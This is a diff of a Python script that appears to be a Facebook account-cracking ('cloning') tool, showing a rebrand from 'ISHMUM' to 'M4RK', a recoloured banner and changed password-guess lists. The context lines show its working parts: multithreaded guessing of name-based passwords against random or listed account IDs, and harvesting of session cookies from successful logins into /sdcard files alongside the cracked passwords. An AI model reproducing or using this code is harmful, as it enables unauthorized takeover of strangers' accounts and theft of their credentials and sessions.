@@ -145,7 +145,7 @@ def p(x):
 	print(x)
 os.system(f'xdg-open https://chat.whatsapp.com/BTjSpLJPWxV5B5hqNcW2J0')
 
-logo=("""\033[1;37m  	
+logo=("""\033[1;91m  	
 ███╗░░░███╗░░██╗██╗██████╗░██╗░░██╗
 ████╗░████║░██╔╝██║██╔══██╗██║░██╔╝
 ██╔████╔██║██╔╝░██║██████╔╝█████═╝░
@@ -153,14 +153,14 @@ logo=("""\033[1;37m
 ██║░╚═╝░██║╚════██║██║░░██║██║░╚██╗
 ╚═╝░░░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
                                             
----------------------------------------------------
-\033[1;37m [•] \033[1;37mOwner     :   M4RK Sy
- [•] Facebook  :   Mark Sy
- [•] Github    :   m4rkugh
- [•] Tool      :   FREE ONLY USER
- [•] FBLINK :   facebook.com/m4rk.sy
- [•] Version   :  \033[1;32m 0.1\033[1;32m \033[1;37m
-\033[1;37m----------------------------------------------""")
+\033[1;91m---------------------------------------------------
+\033[1;91m [•] \033[1;37mOwner     :   M4RK Sy
+\033[1;91m [•] Facebook  :   ≫ Mark Sy ≪
+\033[1;91m [•] Github    :   m4rkugh
+\033[1;91m [•] Tool      :   FREE ONLY USER
+\033[1;91m [•] FBLINK :   https://www.facebook.com/m4rk.sy
+\033[1;91m [•] Version   :  \033[1;32m 0.1\033[1;32m \033[1;37m
+\033[1;91m----------------------------------------------""")
 def linex():
         print('\033[1;37m----------------------------------------------')
 def clear():
@@ -176,7 +176,7 @@ id=[]
 
 def menu():
                         clear()	
-                        print(' [1] File cloning\n [2] Create file\n [3] Random cloning\n [4] Random gmail crack\n [5] WhatsApp Group (join)\n [0] Exit')
+                        print(' [1] FILE CR4CKING\n [2] CREATE FILE\n [3] RANDOM CLONING\n [4] RANDOM GMAIL CR4CK\n [5] WhatsApp Group (join)\n [0] EXIT')
                         linex()
                         xd=input(' Choose an option: ')
                         if xd in ['1','01']:
@@ -198,7 +198,7 @@ def menu():
                                 mthd=input(' Choose: ')
                                 linex()
                                 plist = []
-                                print(" [1] -SHESH Password \n [2] Choice Password ")                                
+                                print(" [1] AUTO PASSWORD \n [2] CHOICE PASSWORD ")                                
                                 linex()
                                 psx=input(' Choose: ')
                                 if psx in ['1','01']:
@@ -209,23 +209,23 @@ def menu():
                                         plist.append('first1234')     
                                         plist.append('firstlast123')
                                         plist.append('firstlast1234')
-                                        plist.append('firstlast@123')
+                                        plist.append('firstlast143')
                                         plist.append("last123")
                                         plist.append("Last12345")
                                         plist.append('first123456')
-                                        plist.append('first@123')
-                                        plist.append('First@123')
+                                        plist.append('first143')
+                                        plist.append('last143')
                                         plist.append('first321')
-                                        plist.append('First@12')
-                                        plist.append('first@1234')
                                         plist.append('First123')
-                                        plist.append('@first123')
-                                        plist.append('@first1234')
-                                        plist.append('first@@@')
+                                        plist.append('firstpogi')
+                                        plist.append('firstganda')
+                                        plist.append('first2005')
+                                        plist.append('first2006')
+                                        plist.append('first2007')
                                 else:
                                         try:
                                                 linex()
-                                                ps_limit = int(input(' How many passwords do you want to add ? '))
+                                                ps_limit = int(input(' HOW MANY PASSWORD DO YOU WANT TO ADD? '))
                                         except:
                                                 ps_limit =1
                                         linex()
@@ -245,7 +245,7 @@ def menu():
                                 with tred(max_workers=30) as crack_submit:
                                         clear()
                                         total_ids = str(len(fo))
-                                        print(' Total account : \033[1;32m'+total_ids)
+                                        print(' TOTAL ACCOUNT FROM YOUR FILE: \033[1;32m'+total_ids)
                                         print("\033[1;37m \x1b[38;5;208mUSE AIRPLANE MODE FOR MORE OK IDS\033[1;37m")
                                         linex()
                                         for user in fo:
@@ -270,7 +270,7 @@ def menu():
                                 print("next update")
                         elif xd in ['3','03']:
                                 clear()
-                                print(' [1] OTHER COUNTRY cloning\n [2] PH cloning\n [3] OTHER COUNTRY cloning\n [0] Back menu')
+                                print(' [1] OTHER COUNTRY cloning\n [2] OTHER COUNTRY cloning\n [3] OTHER COUNTRY cloning\n [0] Back menu')
                                 linex()
                                 x=input(' Choose: ')
                                 if x in ['1','01']:
@@ -336,7 +336,7 @@ def npxind():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(6))
                         user.append(nmp)
-                with tred(max_workers=30) as ISHMUM:     
+                with tred(max_workers=30) as MARK:     
                         clear()
                         id = str(len(user))
                         print('Total account : \033[1;32m'+id)
@@ -486,7 +486,7 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                M4RK.submit(rndm,ids,passlist)
+                                MARK.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
@@ -950,7 +950,7 @@ def rndm1(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [ISHMUM-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [M4RK-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}" 
                                         open('/sdcard/MARKM1-COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                         open('/sdcard/MARKM1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
